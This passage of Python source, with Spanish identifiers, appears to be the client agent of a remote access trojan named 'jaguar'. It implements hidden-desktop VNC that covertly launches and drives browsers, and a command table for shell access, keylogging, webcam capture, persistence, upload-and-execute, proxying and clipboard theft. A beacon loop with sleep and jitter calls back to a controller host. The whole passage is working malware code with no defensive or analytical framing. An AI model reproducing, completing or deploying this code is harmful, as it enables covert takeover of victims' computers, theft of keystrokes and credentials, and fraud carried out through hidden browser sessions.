    si.cb = ctypes.sizeof(_STARTUPINFOW)
    si.lpDesktop = "winsta0\\" + desktop
    si.dwFlags = 0x00000001                    # STARTF_USESHOWWINDOW
    si.wShowWindow = 4                         # SW_SHOWNOACTIVATE
    pi = _PROCESS_INFORMATION()
    buf = ctypes.create_unicode_buffer(linea)
    ok = _k32.CreateProcessW(None, buf, None, None, False, 0, None, None,
                             ctypes.byref(si), ctypes.byref(pi))
    if not ok:
        raise OSError(f"CreateProcess fallo err={ctypes.GetLastError()} exe={exe}")
    pid, hproc = pi.dwProcessId, pi.hProcess
    try:
        _k32.CloseHandle(pi.hThread)
    except Exception:
        pass
    return pid, hproc


def _hvnc_lanzar(nav, url=None):
    exe = _ruta_navegador(nav)
    if not exe:
        raise OSError(f"navegador '{nav}' no encontrado (registro/PATH/rutas)")
    perfil = os.path.join(tempfile.gettempdir(),
                          f"jaguar_hvnc_{nav}_{os.getpid()}_{int(time.time())}")
    try:
        os.makedirs(perfil, exist_ok=True)
    except Exception:
        pass
    objetivo = '"%s"' % url if url else "about:blank"
    extra = _FLAGS_CHROMIUM if nav in ("chrome", "google-chrome", "edge",
                                       "msedge", "brave", "opera") else ""
    linea = ('"{}" --user-data-dir="{}" --no-first-run --no-default-browser-check '
             '--new-window --window-size=1280,800 {} {}').format(
        exe, perfil, objetivo, extra)
    pid, hproc = _hvnc_crear(exe, linea, DESKTOP_NAME)
    _log("HVNC", f"lanzado pid={pid} exe={exe}")
    if _k32.WaitForSingleObject(hproc, 1500) == 0:
        code = wintypes.DWORD()
        _k32.GetExitCodeProcess(hproc, ctypes.byref(code))
        _log("HVNC", f"AVISO: salio enseguida exit={code.value}")
    return pid, perfil


def _hvnc_buscar_ventana():
    hd = _u32.OpenDesktopW(DESKTOP_NAME, 0, False, DESKTOP_ACCESS)
    if not hd:
        return None
    halladas = []

    def cb(hwnd, lparam):
        try:
            if not _u32.IsWindowVisible(hwnd):
                return True
            cls = ctypes.create_unicode_buffer(256)
            _u32.GetClassNameW(hwnd, cls, 256)
            if cls.value in _CLASES_BROWSER:
                r = _RECT()
                _u32.GetWindowRect(hwnd, ctypes.byref(r))
                if (r.right - r.left) > 200 and (r.bottom - r.top) > 150:
                    halladas.append(hwnd)
        except Exception:
            pass
        return True

    _u32.EnumDesktopWindows(hd, _ENUMPROC(cb), 0)
    _u32.CloseDesktop(hd)
    return halladas[0] if halladas else None


def _hvnc_destino(x, y):
    """Dado (x,y) en cliente del HWND raiz, devuelve el HWND mas profundo y
    coordenadas relativas a el (necesario para Chrome/Edge/Brave)."""
    hwnd = _HVNC.get("hwnd")
    if not hwnd:
        return None, x, y
    actual, cx, cy = hwnd, int(x), int(y)
    for _ in range(8):
        try:
            hijo = _u32.ChildWindowFromPointEx(actual, _POINT(cx, cy), 0)
        except Exception:
            break
        if not hijo or hijo == actual:
            break
        p = _POINT(cx, cy)
        try:
            _u32.MapWindowPoints(actual, hijo, ctypes.byref(p), 1)
        except Exception:
            pass
        cx, cy = p.x, p.y
        actual = hijo
    return actual, cx, cy


def _hvnc_foco():
    hwnd = _HVNC.get("hwnd")
    if not hwnd:
        return None
    try:
        tid = _u32.GetWindowThreadProcessId(hwnd, None)
        gti = _GUITHREADINFO()
        gti.cbSize = ctypes.sizeof(_GUITHREADINFO)
        if _u32.GetGUIThreadInfo(tid, ctypes.byref(gti)) and gti.hwndFocus:
            return gti.hwndFocus
    except Exception:
        pass
    return hwnd


def _hvnc_iniciar(a):
    nav = (a.get("navegador") or "chrome").lower()
    hdesk = _hvnc_crear_desktop()
    if not hdesk:
        return {"error": "no se pudo crear el desktop oculto"}
    _HVNC.update({"hwnd": None, "navegador": nav, "error": None, "hash": None,
                  "estado": "arrancando"})
    _HVNC["exe"] = _ruta_navegador(nav)
    _log("HVNC", f"iniciar nav={nav} exe={_HVNC['exe']} shell={bool(a.get('shell'))}")

    def trabajo():
        ok = _u32.SetThreadDesktop(hdesk)
        _log("HVNC", f"SetThreadDesktop={'ok' if ok else 'fallo'}")
        if a.get("shell"):
            try:
                win = os.path.join(os.environ.get("WINDIR", r"C:\Windows"), "explorer.exe")
                _hvnc_crear(win, '"%s"' % win, DESKTOP_NAME)
                _log("HVNC", "explorer.exe lanzado")
            except Exception as e:
                _log("HVNC", f"explorer fallo: {e}")
        if a.get("cmd"):
            try:
                cmd = os.path.join(os.environ.get("WINDIR", r"C:\Windows"),
                                   "System32", "cmd.exe")
                _hvnc_crear(cmd, '"%s" /k cd /d %USERPROFILE%' % cmd, DESKTOP_NAME)
                _log("HVNC", "cmd.exe lanzado")
            except Exception as e:
                _log("HVNC", f"cmd fallo: {e}")
        try:
            _HVNC["pid"], _HVNC["perfil"] = _hvnc_lanzar(nav)
        except Exception as e:
            _HVNC["error"] = str(e)
            _HVNC["estado"] = "error"
            _log("HVNC", f"ERROR lanzando: {e}")
            return
        for _ in range(60):
            time.sleep(0.4)
            h = _hvnc_buscar_ventana()
            if h:
                _HVNC["hwnd"] = h
                _HVNC["estado"] = "activo"
                _log("HVNC", f"ventana encontrada hwnd={h}")
                return
        _HVNC["estado"] = "sin_ventana"
        _log("HVNC", "ventana NO encontrada (mira jaguar.log)")

    threading.Thread(target=trabajo, daemon=True).start()
    return {"estado": "arrancando", "navegador": nav, "exe": _HVNC["exe"]}


def _hvnc_estado(a):
    return {k: v for k, v in _HVNC.items() if k != "_sd"}


def _hvnc_opciones(a):
    for k in ("calidad", "escala", "fps"):
        if k in a:
            try:
                _HVNC_CFG[k] = float(a[k])
            except Exception:
                pass
    return {"opciones": dict(_HVNC_CFG)}


def _hvnc_navegar(a):
    nav = (a.get("navegador") or _HVNC.get("navegador") or "chrome").lower()
    try:
        _hvnc_lanzar(nav, a.get("url", ""))
        return {"estado": "navegando"}
    except Exception as e:
        _log("HVNC", f"ERROR navegar: {e}")
        return {"error": str(e)}


def _hvnc_captura(a):
    hwnd = _HVNC.get("hwnd") or _hvnc_buscar_ventana()
    if not hwnd or not _u32.IsWindow(hwnd):
        return {"w": 1, "h": 1, "b64": ""}
    _HVNC["hwnd"] = hwnd
    r = _RECT()
    _u32.GetWindowRect(hwnd, ctypes.byref(r))
    w, h = r.right - r.left, r.bottom - r.top
    if w <= 0 or h <= 0:
        return {"w": 1, "h": 1, "b64": ""}
    hdc = _u32.GetWindowDC(hwnd)
    mdc = _g32.CreateCompatibleDC(hdc)
    bmp = _g32.CreateCompatibleBitmap(hdc, w, h)
    viejo = _g32.SelectObject(mdc, bmp)
    if not _u32.PrintWindow(hwnd, mdc, PW_RENDERFULLCONTENT):
        _u32.PrintWindow(hwnd, mdc, 0)
    bmi = _BITMAPINFO()
    bmi.bmiHeader.biSize = ctypes.sizeof(_BIH)
    bmi.bmiHeader.biWidth = w
    bmi.bmiHeader.biHeight = -h
    bmi.bmiHeader.biPlanes = 1
    bmi.bmiHeader.biBitCount = 32
    buf = ctypes.create_string_buffer(w * h * 4)
    _g32.GetDIBits(mdc, bmp, 0, h, buf, ctypes.byref(bmi), 0)
    _g32.SelectObject(mdc, viejo)
    _g32.DeleteObject(bmp)
    _g32.DeleteDC(mdc)
    _u32.ReleaseDC(hwnd, hdc)

    datos = buf.raw
    calidad = int(_HVNC_CFG.get("calidad", 55))
    escala = float(_HVNC_CFG.get("escala", 0.75)) or 1.0
    raw = b""
    try:
        import cv2
        import numpy as np
        arr = np.frombuffer(datos, dtype=np.uint8).reshape((h, w, 4))[:, :, :3]
        if escala != 1.0:
            arr = cv2.resize(arr, None, fx=escala, fy=escala,
                             interpolation=cv2.INTER_AREA)
        ok, jpg = cv2.imencode(".jpg", arr, [int(cv2.IMWRITE_JPEG_QUALITY), calidad])
        raw = jpg.tobytes() if ok else b""
    except Exception:
        try:
            from PIL import Image
            img = Image.frombuffer("RGB", (w, h), datos, "raw", "BGRX", 0, 1)
            bio = io.BytesIO()
            img.save(bio, "JPEG", quality=calidad)
            raw = bio.getvalue()
        except Exception:
            raw = b""

    if not raw:
        return {"w": w, "h": h, "b64": ""}
    huella = hashlib.md5(raw).digest()
    if huella == _HVNC.get("hash") and not a.get("forzar"):
        return {"w": w, "h": h, "b64": "", "sin_cambios": True}
    _HVNC["hash"] = huella
    return {"w": w, "h": h, "b64": base64.b64encode(raw).decode()}


def _hvnc_raton(a):
    hwnd = _HVNC.get("hwnd") or _hvnc_buscar_ventana()
    if not hwnd:
        return {"estado": "sin ventana"}
    _HVNC["hwnd"] = hwnd
    accion = a.get("accion")
    r = _RECT()
    _u32.GetWindowRect(hwnd, ctypes.byref(r))
    sx = r.left + int(a.get("x", 0))
    sy = r.top + int(a.get("y", 0))
    pt = _POINT(sx, sy)
    _u32.ScreenToClient(hwnd, ctypes.byref(pt))
    objetivo, cx, cy = _hvnc_destino(pt.x, pt.y)   # <- hijo real (Chrome)
    if not objetivo:
        objetivo = hwnd
        cx, cy = pt.x, pt.y
    lp_cli = ((cy & 0xFFFF) << 16) | (cx & 0xFFFF)
    lp_scr = ((sy & 0xFFFF) << 16) | (sx & 0xFFFF)
    if accion == "move":
        _u32.PostMessageW(objetivo, 0x0200, 0, lp_cli)
    elif accion == "down":
        _u32.PostMessageW(objetivo, 0x0201, 1, lp_cli)
    elif accion == "up":
        _u32.PostMessageW(objetivo, 0x0202, 0, lp_cli)
    elif accion == "right_down":
        _u32.PostMessageW(objetivo, 0x0204, 2, lp_cli)
    elif accion == "right_up":
        _u32.PostMessageW(objetivo, 0x0205, 0, lp_cli)
    elif accion == "doble":
        _u32.PostMessageW(objetivo, 0x0203, 1, lp_cli)
    elif accion == "scroll":
        _u32.PostMessageW(objetivo, 0x020A, (int(a.get("delta", 120)) & 0xFFFF) << 16, lp_scr)
    return {"estado": accion}


def _hvnc_teclado(a):
    objetivo = _hvnc_foco() or _HVNC.get("hwnd") or _hvnc_buscar_ventana()
    if not objetivo:
        return {"estado": "sin ventana"}
    if "vk" in a:
        vk = int(a["vk"])
        scan = _u32.MapVirtualKeyW(vk, 0)
        _u32.PostMessageW(objetivo, 0x0100, vk, (scan << 16))
        _u32.PostMessageW(objetivo, 0x0101, vk, (scan << 16) | (1 << 30) | (1 << 31))
    elif "texto" in a:
        for ch in a["texto"]:
            _u32.PostMessageW(objetivo, 0x0102, ord(ch), 0)
    return {"estado": "ok"}


def _hvnc_cerrar(a):
    pid = _HVNC.get("pid")
    try:
        if pid:
            subprocess.run(["taskkill", "/PID", str(pid), "/T", "/F"],
                           capture_output=True, **_sin_consola())
    except Exception:
        pass
    # Respaldo: matar por nombre de imagen si quedo algun proceso vivo.
    try:
        exe = _HVNC.get("exe")
        if exe and os.path.isfile(exe):
            subprocess.run(["taskkill", "/IM", os.path.basename(exe), "/F"],
                           capture_output=True, **_sin_consola())
    except Exception:
        pass
    _HVNC["pid"] = None
    hwnd = _HVNC.get("hwnd")
    try:
        if hwnd and _u32.IsWindow(hwnd):
            _u32.PostMessageW(hwnd, 0x0010, 0, 0)
    except Exception:
        pass
    _HVNC["hwnd"] = None
    perfil = _HVNC.get("perfil")
    if perfil:
        shutil.rmtree(perfil, ignore_errors=True)
        _HVNC["perfil"] = None
    _HVNC["hash"] = None
    _HVNC["estado"] = "idle"
    try:
        if _HVNC.get("hdesk"):
            _u32.CloseDesktop(_HVNC["hdesk"])
        _HVNC["hdesk"] = None
    except Exception:
        pass
    _log("HVNC", "cerrado")
    return {"estado": "HVNC cerrado"}


HANDLERS = {
    "ping": _ping, "shell": _shell, "sysinfo": lambda a: _sysinfo(),
    "listar_dir": _listar_dir, "procesos": _procesos, "captura": _captura,
    "raton": _raton, "swap_raton": _swap_raton, "teclado": _teclado, "webcam": _webcam,
    "webcam_iniciar": _webcam_iniciar, "webcam_frame": _webcam_frame, "webcam_parar": _webcam_parar,
    "keylogger_iniciar": _keylogger_iniciar, "keylogger_leer": _keylogger_leer,
    "persistir": _persistir, "abrir_url": _abrir_url, "mensaje": _mensaje,
    "descargar": _descargar, "subir_ejecutar": _subir_ejecutar,
    "proxy_iniciar": _proxy_iniciar, "proxy_parar": _proxy_parar,
    "hvnc_iniciar": _hvnc_iniciar, "hvnc_cerrar": _hvnc_cerrar, "hvnc_navegar": _hvnc_navegar,
    "hvnc_estado": _hvnc_estado, "hvnc_opciones": _hvnc_opciones, "log": _log_leer,
    "hvnc_captura": _hvnc_captura, "hvnc_raton": _hvnc_raton, "hvnc_teclado": _hvnc_teclado,
    "bloquear_entrada": _bloquear, "clip_get": _clip_get, "clip_set": _clip_set,
    "desconectar": _desconectar,
}

_RUIDO = ("ping", "raton", "teclado", "hvnc_captura", "hvnc_raton",
          "hvnc_teclado", "webcam_frame", "captura", "hvnc_estado")


def _bucle(sock):
    global SLEEP, JITTER
    while True:
        msg = _recibir(sock)
        if msg is None:
            return
        t = msg.get("tipo")
        if t == "beacon":
            SLEEP = float(msg.get("sleep", SLEEP))
            JITTER = float(msg.get("jitter", 0)) / 100.0
            _log("BEACON", f"sleep={SLEEP} jitter={JITTER}")
            continue
        if t != "comando":
            continue
        cmd = msg.get("cmd")
        if cmd not in _RUIDO:
            _log("CMD", cmd)
        fn = HANDLERS.get(cmd)
        try:
            datos = fn(msg.get("args") or {}) if fn else {"error": "cmd desconocido"}
            _enviar(sock, {"tipo": "respuesta", "cmd": cmd, "ok": True, "datos": datos})
        except Exception as e:
            _log("ERROR", f"{cmd}: {e}")
            _enviar(sock, {"tipo": "respuesta", "cmd": cmd, "ok": False, "error": str(e)})
        if _SALIR:
            os._exit(0)


def _intentar(h, puerto, timeout):
    try:
        s = socket.create_connection((h, puerto), timeout=timeout)
        s.settimeout(None)
        return s
    except Exception:
        return None


def _conectar(objetivos, puerto, timeout=5.0):
    """Prueba todos los hosts EN PARALELO y devuelve la primera conexión viva."""
    logrados = {}

    def _w(h):
        s = _intentar(h, puerto, timeout)
        if s is not None:
            logrados[h] = s

    hilos = [threading.Thread(target=_w, args=(h,), daemon=True) for h in objetivos]
    for t in hilos:
        t.start()
    fin = time.time() + timeout + 1.0
    while not logrados and time.time() < fin:
        time.sleep(0.05)
    if not logrados:
        return None
    _, s = next(iter(logrados.items()))
    for h2, s2 in logrados.items():
        if s2 is not s:
            try:
                s2.close()
            except Exception:
                pass
    return s


def main():
    host, puerto, fb = _cfg()
    objetivos = []
    for h in (host, fb, "127.0.0.1"):
        if h and h not in objetivos:
            objetivos.append(h)
    _log("AGENTE", f"inicio pid={os.getpid()} objetivos={objetivos} puerto={puerto}")
    while True:
        s = _conectar(objetivos, puerto, timeout=5.0)
        if s is not None:
            try:
                _enviar(s, {"tipo": "hola", "info": _sysinfo()})
                _log("AGENTE", "conectado al controlador")
                _bucle(s)
                _log("AGENTE", "desconectado")
            except SystemExit:
                return
            except Exception as e:
                _log("AGENTE", f"error de sesion: {e}")
            try:
                s.close()
            except Exception:
                pass
        time.sleep(SLEEP * (1 + random.uniform(-JITTER, JITTER)))


if __name__ == "__main__":
    main()